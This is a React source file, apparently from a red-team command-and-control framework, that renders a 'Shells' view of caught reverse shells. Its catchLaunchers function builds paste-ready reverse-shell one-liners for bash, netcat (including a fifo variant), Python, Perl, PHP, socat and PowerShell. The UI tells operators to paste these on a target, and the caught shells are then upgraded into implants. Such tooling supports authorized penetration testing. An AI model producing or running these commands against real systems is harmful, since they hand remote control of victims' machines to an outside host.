import { useCallback, useEffect, useState } from 'react'
import { type ListenerSummary, type ShellSession, listListeners, listShells } from '../api'
import { Icon } from '../components/Icons'
import { ShellConsole } from '../components/ShellConsole'
import { StatusBadge } from '../components/StatusBadge'

// The engagement's caught shells: the roster of connections a shellcatch
// listener holds, each speaking no Rod protocol -- the anonymous arrivals
// scoped by the listener they landed on. The roster refreshes on the live
// tick (a shell joining or leaving the roster bumps it) with a slow poll as
// reconciliation; selecting a shell opens the console under the table.
//
// Catching starts here too: each shellcatch listener renders its paste-ready
// catch one-liners above the table, derived from the listener's public
// endpoint -- the field's whole purpose, since that endpoint is the address
// the target dials. The render is advisory like the console's Upgrade
// launchers: the operator pastes it on the target, the arrival lands in the
// roster below.

// The paste-ready catch one-liners for one shellcatch listener's public
// endpoint (stored host:port): the classic documented reverse-shell shapes
// across the interpreter families a target is likely to have, mirroring the
// console's Upgrade launcher rendering. Pure rendering of (host, port) into
// commands -- no credential is minted, so the client renders from the roster
// it already holds.
function catchLaunchers(
  publicEndpoint: string,
): { id: string; os: string; command: string }[] {
  const hostPort = publicEndpoint.replace(/^[a-z][a-z0-9+.-]*:\/\//i, '')
  const colon = hostPort.lastIndexOf(':')
  if (colon <= 0 || colon === hostPort.length - 1) return []
  const host = hostPort.slice(0, colon).replace(/^\[/, '').replace(/\]$/, '')
  const port = hostPort.slice(colon + 1)
  if (!/^\d+$/.test(port)) return []
  const fifo = '/tmp/.rod-catch'
  return [
    { id: 'unix-bash', os: 'linux', command: `bash -i >& /dev/tcp/${host}/${port} 0>&1` },

    // The -e flag belongs to traditional/GNU netcat; the OpenBSD build
    // refuses it, so the fifo shape (a /bin/sh over the pipe) rides beside
    // it. Showing both costs nothing while a missing one costs a round trip.
    { id: 'unix-nc', os: 'linux', command: `nc -e /bin/sh ${host} ${port}` },
    {
      id: 'unix-nc-fifo',
      os: 'linux',
      command: `rm -f ${fifo}; mkfifo ${fifo}; cat ${fifo} | /bin/sh -i 2>&1 | nc ${host} ${port} > ${fifo}`,
    },

    { id: 'unix-python', os: 'linux', command: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${host}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },

    { id: 'unix-perl', os: 'linux', command: `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` },

    { id: 'unix-php', os: 'linux', command: `php -r '$s=fsockopen("${host}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'` },

    { id: 'unix-socat', os: 'linux', command: `socat exec:'bash -i',pty,stderr,setsid,sigint,sane tcp:${host}:${port}` },

    {
      id: 'windows-powershell',
      os: 'windows',
      command:
        `powershell -c "$c=New-Object Net.Sockets.TCPClient('${host}',${port});` +
        `$s=$c.GetStream();[byte[]]$b=0..65535|%{0};` +
        `while(($i=$s.Read($b,0,$b.Length)) -ne 0){` +
        `$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);` +
        `$o=(iex $d 2>&1|Out-String);` +
        `$r=$o+'PS '+(pwd).Path+'> ';` +
        `$q=[text.encoding]::ASCII.GetBytes($r);` +
        `$s.Write($q,0,$q.Length);$s.Flush()};$c.Close()"`,
    },
  ]
}

export function ShellsView({
  engagementId,
  onlineTick,
}: {
  engagementId: string
  onlineTick: number
}) {
  const [shells, setShells] = useState<ShellSession[]>([])
  const [catchers, setCatchers] = useState<ListenerSummary[]>([])
  const [selectedId, setSelectedId] = useState<string | null>(null)
  const [error, setError] = useState<string | null>(null)
  const [copied, setCopied] = useState<string | null>(null)

  const refresh = useCallback(async () => {
    try {
      setShells(await listShells(engagementId))
      setError(null)
    } catch (e) {
      setError(String(e))
    }
  }, [engagementId])

  useEffect(() => {
    void refresh()
  }, [refresh, onlineTick])

  // The shellcatch listeners, for the catch one-liners: loaded with the
  // roster's tick rather than the slow poll -- listeners change rarely, and
  // the panels only need to exist, not to reconcile.
  useEffect(() => {
    void (async () => {
      try {
        setCatchers((await listListeners(engagementId)).filter((l) => l.transport === 'shellcatch'))
      } catch {
        // A failed load leaves the panels absent; the roster above still works.
      }
    })()
  }, [engagementId, onlineTick])

  // Reconciliation only: a dropped SSE connection loses the roster events,
  // and the slow poll re-anchors to the server's view.
  useEffect(() => {
    const timer = window.setInterval(() => void refresh(), 5000)
    return () => window.clearInterval(timer)
  }, [refresh])

  // The selected shell's console reads the live entity from the roster, so
  // the status pill moves with the roster refreshes rather than a stale
  // copy captured at selection.
  const selected = shells.find((s) => s.sessionId === selectedId) ?? null

  // A selection that ended stays readable until the operator dismisses it:
  // the transcript is the working view, the audit trail is the record.
  const onEnded = useCallback(() => void refresh(), [refresh])

  const copy = async (id: string, text: string) => {
    try {
      await navigator.clipboard.writeText(text)
      setCopied(id)
      window.setTimeout(() => setCopied(null), 1500)
    } catch {
      // Clipboard permission denied: the command stays selectable to copy
      // by hand.
    }
  }

  return (
    <section className="view">
      <h2>Shells</h2>
      <p className="muted">
        Reverse shells caught on this engagement's shellcatch listeners. A caught shell speaks no
        protocol and carries no identity — it is scoped by the listener it landed on — and grows
        into a real implant through the console's Upgrade launchers.
      </p>
      {error && <p className="error">{error}</p>}

      {catchers.map((listener) => {
        const launchers = catchLaunchers(listener.publicEndpoint)
        if (launchers.length === 0) return null
        return (
          <div key={listener.id} className="upgrade-panel">
            <p>
              Paste one of these on the target to land a shell on <code>{listener.name}</code> (
              <code>{listener.publicEndpoint}</code>) — the listener's public endpoint, the address
              the target dials.
            </p>
            {launchers.map((launcher) => (
              <div key={launcher.id} className="upgrade-launcher">
                <code>{launcher.id}</code>
                <code className="upgrade-command">{launcher.command}</code>
                <button className="ghost sm" onClick={() => void copy(launcher.id, launcher.command)}>
                  {copied === launcher.id ? 'Copied' : 'Copy'}
                </button>
              </div>
            ))}
          </div>
        )
      })}

      <div className="table-wrap">
        <table>
          <thead>
            <tr>
              <th>Status</th>
              <th>Remote</th>
              <th>Shell</th>
              <th>Opened</th>
              <th>Last output</th>
              <th>Grew into</th>
              <th></th>
            </tr>
          </thead>
          <tbody>
            {shells.length === 0 && (
              <tr>
                <td colSpan={7}>
                  <div className="empty">
                    <Icon name="terminal" />
                    {catchers.length > 0
                      ? 'No shells caught yet -- paste one of the catch one-liners above on the target.'
                      : 'No shells caught yet -- create a shellcatch listener under Listeners first.'}
                  </div>
                </td>
              </tr>
            )}
            {shells.map((shell) => (
              <tr
                key={shell.sessionId}
                className={shell.sessionId === selectedId ? 'selected' : undefined}
              >
                <td>
                  <StatusBadge status={shell.status} />
                </td>
                <td>
                  <code>{shell.remoteAddress}</code>
                </td>
                <td>
                  <code>{shell.os}</code>
                </td>
                <td>{new Date(shell.openedAt).toLocaleTimeString()}</td>
                <td>
                  {shell.lastOutputAt ? new Date(shell.lastOutputAt).toLocaleTimeString() : '—'}
                </td>
                <td>
                  {shell.upgradedImplantId ? (
                    <code>{shell.upgradedImplantId.slice(0, 8)}</code>
                  ) : (
                    '—'
                  )}
                </td>
                <td>
                  <button
                    className={shell.sessionId === selectedId ? 'ghost sm' : 'primary sm'}
                    onClick={() =>
                      setSelectedId((current) =>
                        current === shell.sessionId ? null : shell.sessionId,
                      )
                    }
                  >
                    {shell.sessionId === selectedId ? 'Hide console' : 'Console'}
                  </button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
      {selected && (
        <ShellConsole engagementId={engagementId} shell={selected} onEnded={onEnded} />
      )}
    </section>
  )
}
